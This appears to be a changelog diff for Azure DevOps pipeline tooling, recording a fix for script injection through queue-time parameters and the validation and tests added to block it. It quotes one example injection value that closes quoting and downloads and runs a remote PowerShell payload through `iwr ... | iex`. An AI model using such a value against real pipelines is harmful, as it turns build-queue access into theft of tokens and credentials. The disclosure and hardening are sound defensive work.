@@ -12,6 +12,32 @@ breaking change to a schema is a major version, whatever the code did.
 
 ### Security
 
+- **Pipelines** — queue-time parameters no longer reach a script body as template
+  expressions. A template expression is expanded at compile time, so interpolating a
+  free-text parameter into a script pastes the value in as source code; `applicationKey`,
+  `organizationUrl` and `project` are all `type: string` with no closed value list, and
+  all three were interpolated that way in jobs holding `ADO_PAT` and the SFTP
+  credentials. A value of `x'; iwr http://host/payload.ps1 | iex; '` closed the quoting
+  and ran on the agent, turning permission to queue a build into permission to read the
+  token. Every parameter now arrives via `env:` and is read with `$env:PARAM_*`.
+- **Pipelines** — every parameter is validated at run time before use: required ones must
+  be non-empty, all must be single-line, and each is matched against an expected pattern
+  (`organizationUrl` against the Azure DevOps URL shape, `applicationKey` against the
+  schema's own `^[A-Za-z0-9][A-Za-z0-9_-]*$`, `environment` against `^[A-Z0-9_]+$`). The
+  single-line check matters independently of the injection: even as data, a value with a
+  newline would append arbitrary `KEY=VALUE` lines to `.env.pipeline`, enough to override
+  `ADO_PAT`. `command` is re-checked against its closed list rather than trusting the
+  parameter declaration to survive a future edit.
+
+### Added
+
+- **Tests** — four cases asserting that no pipeline interpolates a template expression
+  outside an `env:` assignment, that each pipeline actually maps its parameters (so the
+  first check cannot pass vacuously), and that every mapped parameter is read back out of
+  the environment (so hardening cannot rot into dead mappings).
+
+### Security
+
 - **`variable-group-configuration`, `service-connection-provisioning`** — `apply` now
   requires `-ApplicationKey`. In both modules the parameter was a plain filter, so
   `apply -ConfirmApply` with no key wrote to every application in scope multiplied by
